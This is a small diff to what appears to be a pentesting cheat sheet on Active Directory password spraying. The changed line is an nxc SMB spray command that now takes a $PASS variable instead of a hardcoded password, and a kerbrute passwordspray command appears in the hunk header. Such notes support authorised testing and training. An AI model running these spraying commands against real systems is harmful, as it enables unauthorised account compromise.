@@ -21,5 +21,5 @@ kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt Welcome1
 ### <span style="color:#50FA7B">nxc PASSWORD SPRAY</span>
 ```bash
 # Tries Password123 against all users, shows only successful (+)
-nxc smb $VICTIM_IP -u users.txt -p Password123 | grep +
+nxc smb $VICTIM_IP -u users.txt -p $PASS | grep +
 ```
